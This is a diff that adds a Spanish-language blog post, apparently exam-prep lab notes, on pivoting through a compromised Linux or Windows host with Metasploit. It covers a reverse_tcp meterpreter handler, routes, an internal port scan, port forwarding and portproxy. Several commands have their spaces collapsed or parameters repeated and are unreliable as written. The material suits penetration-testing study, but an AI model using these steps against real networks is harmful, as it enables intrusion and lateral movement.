@@ -1,0 +1,274 @@
+---
+layout: post
+title:  "NMAP"
+date:   2026-02-24 11:04:18 +0100
+categories: jekyll update
+author: mrallfredii
+tags: pivoting portfwd
+---
+
+# Pivoting Linux
+
+# 🧠 ESCENARIO REALISTA DE EXAMEN
+
+### 🔴 Kali (atacante)
+
+```
+192.168.1.100
+```
+
+### 🟡 Linux intermedio (comprometido)
+
+```
+eth0 → 192.168.1.50
+eth1 → 10.10.20.5
+```
+
+### 🔵 Linux objetivo interno
+
+```
+10.10.20.15
+```
+
+Kali **NO puede acceder directamente** a `10.10.20.0/24`.
+
+---
+
+# 🥇 PASO 1 — Tienes sesión meterpreter en la máquina intermedia
+
+```
+msfconsole
+use exploit/multi/handler
+set payload linux/x64/meterpreter/reverse_tcp
+set LHOST192.168.1.100
+set LPORT4444
+run
+```
+
+Obtienes:
+
+```
+meterpreter >
+```
+
+Verificas red:
+
+```
+meterpreter > ifconfig
+```
+
+Resultado:
+
+```
+eth0 → 192.168.1.50
+eth1 → 10.10.20.5
+```
+
+👉 Red interna detectada: `10.10.20.0/24`
+
+---
+
+# 🥈 PASO 2 — Añadir ruta (FORMA CORRECTA DE EXAMEN)
+
+Aquí es donde muchos fallan.
+
+## 🔹 Opción 1 (CLÁSICA con route add)
+
+Salimos a msfconsole (NO meterpreter):
+
+```
+background
+```
+
+Ver sesiones:
+
+```
+sessions
+```
+
+Ejemplo:
+
+```
+Id 1  meterpreter linux
+```
+
+Añadir ruta manualmente:
+
+```
+route add10.10.20.0255.255.255.01
+```
+
+📌 Significado:
+
+- Red: `10.10.20.0`
+- Máscara: `255.255.255.0`
+- Sesión: `1`
+
+Verificar:
+
+```
+route print
+```
+
+Debe mostrar:
+
+```
+10.10.20.0/255.255.255.0 -> Session 1
+```
+
+---
+
+---
+
+# 🥉 PASO 3 — Escaneo 1-1000 en ONE LINER
+
+Ahora sí puedes escanear.
+
+```
+use auxiliary/scanner/portscan/tcp;set RHOSTS10.10.20.15;set PORTS1-1000;set THREADS50; run
+```
+
+Ejemplo de salida:
+
+```
+[+] 10.10.20.15:22 - TCP OPEN
+[+] 10.10.20.15:80 - TCP OPEN
+```
+
+---
+
+# 🏆 PASO 4 — Port Forwarding
+
+Queremos acceder al SSH del objetivo interno.
+
+Volvemos a meterpreter:
+
+```
+sessions-i1
+```
+
+Añadimos port forwarding:
+
+```
+portfwd add-l2222-p22-r10.10.20.15
+```
+
+Verificamos:
+
+```
+portfwd list
+```
+
+Salida:
+
+```
+0.0.0.0:2222 -> 10.10.20.15:22
+```
+
+---
+
+# 🏁 PASO 5 — Acceso desde Kali
+
+Desde terminal Kali:
+
+```
+ssh user@127.0.0.1-p2222
+```
+
+🔥 Ahora estás en el Linux interno.
+
+# Pivoting Windows
+
+# 🥈 PASO 2 — Añadir ruta (FORMA CORRECTA DE EXAMEN)
+
+Aquí es donde muchos fallan.
+
+## 🔹 Autoroute
+
+Salimos a msfconsole (NO meterpreter):
+
+```
+background
+```
+
+```
+use post/multi/manage/autoroute
+```
+
+Ver sesiones:
+
+```
+sessions
+```
+
+Ejemplo:
+
+```
+Id 1  meterpreter linux
+```
+
+Añadir ruta manualmente:
+
+```
+set SESSION 1
+```
+
+```
+run
+```
+
+```
+route print
+```
+
+# 🥉 PASO 3 — Encontrar hosts objetivo
+
+```
+use post/windows/gather/arp_scanner
+```
+
+```
+set RHOSTS ip.0/24 (victima)
+```
+
+```
+set session 1
+```
+
+```
+run
+```
+
+# 🏆 PASO 4 — Port proxy objetivo - intermedia
+
+```
+use post/windows/manage/portproxy
+```
+
+```
+set connect_address ip vicitma
+```
+
+```
+set connect_address 445 (smb ejemplo)
+```
+
+```
+set local_address 0.0.0.0
+```
+
+```
+set local_port 5000 (puerto en kali, el que queramos)
+```
+
+```
+sessions -l
+```
+
+```
+set session 1
+```
+
+```
+run
+```
